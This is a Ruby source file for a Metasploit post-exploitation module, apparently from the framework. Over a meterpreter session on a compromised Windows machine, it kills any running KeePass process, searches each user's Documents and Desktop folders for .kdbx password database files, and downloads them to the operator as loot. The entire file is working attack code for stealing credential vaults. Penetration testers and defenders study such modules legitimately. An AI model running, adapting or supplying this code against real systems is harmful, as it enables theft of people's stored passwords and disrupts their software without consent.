# $Id: keepass_jacker.rb 2012-05-01 rapid7 $

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'



class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles
	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Keepass Database Finder',
			'Description'   => %q{
				This module downloads any keepass kdbx files that it finds
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'balgan <balgan[at]ptcoresec.eu>', 'klinzter <klinzter[at]ptcoresec.eu'],
				'Version'       => '$Revision: 3195e713 $',
				'Platform'      => [ 'win' ],
				'SessionTypes'  => [ 'meterpreter' ]
				))
	end

	def run
		print_status("Checking All Users Documents Folders For Keepass Files...")
		print_status("Attempting to kill keepass")
		kill_keepass()
		grab_user_profiles().each do |user|
		print_status("Searching #{user['MyDocs']}")
			next if user['MyDocs'] == nil
			dir = user['MyDocs']
			files = client.fs.dir.entries(dir)
			files.each do |f|
				if f.to_s.include?(".kdbx")
					begin
						filelocation = dir + "\\" + f
						jack_keepass(filelocation)
					end
				end
			end
		end

		grab_user_profiles().each do |user|
			print_status("Searching #{user['Desktop']}")
			next if user['Desktop'] == nil
			dir = user['Desktop']
			files = client.fs.dir.entries(dir)
			files.each do |f|
				if f.to_s.include?(".kdbx")
					begin
						filelocation = dir + "\\" + f
						jack_keepass(filelocation)
					end
				end
			end
		end
	end


	def jack_keepass(filename)
		print_status("Downloading:  #{filename}")
		begin
			path = filename
				data = ""
			filesaving = session.fs.file.new(path, "rb")
			until filesaving.eof?
				data << filesaving.read
			store_loot("KEEPASS.kdbx", "text/plain", session, data, filename, "loot #{path}")
			end
		end
	end

	def kill_keepass
		client.sys.process.get_processes().each do |x|
			if x['name'].downcase == "keepass.exe"
				print_status("     Keepass Process Found...")
				print_status("     Killing Process PID #{x['pid']}...")
				session.sys.process.kill(x['pid']) rescue nil
			end
		end
	end
end